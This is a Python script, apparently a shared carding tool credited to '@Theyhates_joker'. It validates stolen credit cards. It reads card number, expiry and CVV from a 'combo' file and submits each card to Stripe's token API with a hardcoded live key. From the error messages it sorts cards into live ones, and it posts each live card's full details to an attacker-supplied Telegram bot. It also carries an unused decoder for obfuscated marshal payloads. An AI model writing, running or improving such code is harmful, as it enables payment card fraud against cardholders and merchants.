#Dec bY JOKER: @Theyhates_joker oN: @JokerToolzz 🔥❄. 


import lzma
import zlib
import codecs
import base64
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));import requests
import pyfiglet,re
import os
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
logo = pyfiglet.figlet_format('		JOKER ')
print(Z+logo)
o=("------------------------------------------------------------")
print(F+o)
combo=input(F+'ENTER COMBO NAME :'+X)
file=open(f'{combo}',"+r")
token = input(C+'ENTER TOKEN :'+X)
ID = input(B+'ENTER ID :'+F)
os.system('clear')
start_num = 0
for P in file.readlines():
    start_num += 1
    cc = P.split('|')[0]
    mes=P.split('|')[1]
    ano=P.split('|')[2][-2:]
    cvv=P.split('|')[3].replace('\n', '')
    P=P.replace('\n', '')

    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

    data = f'time_on_page=50326&guid=793abb62-2502-46c3-af7a-29666dcc57c3edbd51&muid=ec4bda2f-bb4c-4d8e-b396-235b7b8c8a255ead10&sid=0ea6f4d8-52ba-497a-b384-ca8f4a3e0329effed8&key=pk_live_9qEOYw90bvONlj3Hl5lS1lUH00C6DuBYOC&payment_user_agent=stripe.js%2F78ef418&card[number]={cc}&card[cvc]={{{cvv}&card[exp_month]={mes}&card[exp_year]={ano}'

    response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
    msg = response.json()['error']['message']
    if "Your card's expiration month" in msg:
    	print(F+f'[ {start_num} ]',P,' ➜ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅')
    	mgs1=f'''◆ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
◆ 𝑪𝑨𝑹𝑫  ➜ {P}
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ Low Balance  🟢 
━━━━━━━━━━━━━━━━━  
◆ 𝑩𝒀:@Theyhates_joker '''
    	tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={mgs1}"
    	i = requests.post(tlg)
    elif "security code is incorrect" in msg:
    	print(F+f'[ {start_num} ]',P,' ➜ CCN ✅')
    	m1gs=f'''◆ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
◆ 𝑪𝑨𝑹𝑫  ➜ {P}
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ CNN LIVE 🟢
━━━━━━━━━━━━━━━━━  
◆ 𝑩𝒀: @Theyhates_joker '''
    	t1lg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={m1gs}"
    	i = requests.post(t1lg)  
    else:
    	print(Z+f'[ {start_num} ]',P,' ➜ ', msg)

#Dec bY JOKER: @Theyhates_joker oN: @JokerToolzz 🔥❄. 

